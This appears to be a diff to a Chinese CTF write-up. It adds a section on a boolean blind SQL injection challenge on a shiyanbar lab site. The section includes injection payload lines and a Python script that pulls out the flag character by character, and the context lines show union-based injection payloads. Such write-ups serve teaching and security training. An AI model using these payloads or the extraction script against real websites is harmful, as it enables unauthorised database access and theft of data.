@@ -136,5 +136,53 @@ id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.ta
 	ID: 1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1<br>name: baloteli</pre><pre>ID: 1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1<br>name: flag{Y0u_@r3_5O_dAmn_90Od}
 
 
+# 简单的SQL注入3
+
+
+字符型注入
+
+布尔型盲注
+
+```
+1' and (select count(*) from flag)>0--+
+1' and (select ascii(substr(flag,1,1)) from flag limit 0,1)>97--+
+```
+
+
+```
+import requests
+import string
+
+url="http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (select length(flag) from flag limit 0,1)={0}--+"
+url2="http://ctf5.shiyanbar.com/web/index_3.php?id=1' and (select ascii(substr(flag,{0},1)) from flag limit 0,1)={1}--+"
+'''
+i=0
+while True:
+        i+=1
+        res=requests.get(url.format(i))
+        if res.content.find("Hello!")!= -1:
+                print "Found it, i=",i
+                break
+        print "Not found, i=",i
+
+Found it, i= 26
+'''
+printable=string.printable
+print "printable is ",printable
+result=""
+for i in range(26):
+        print "Now i=",i+1
+        for c in (printable):
+                res=requests.get(url2.format(i+1, ord(c)))
+                if res.content.find("Hello!")!= -1:
+                        print "Found it, i=",i+1, "char is ", c
+                        result+=c
+                        break
+print "result is " , result
+
+```
+
+
+
 # 参考
 - [西普实验吧CTF解题Writeup大全](http://hebin.me/2017/09/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7ctf%E8%A7%A3%E9%A2%98writeup%E5%A4%A7%E5%85%A8/)
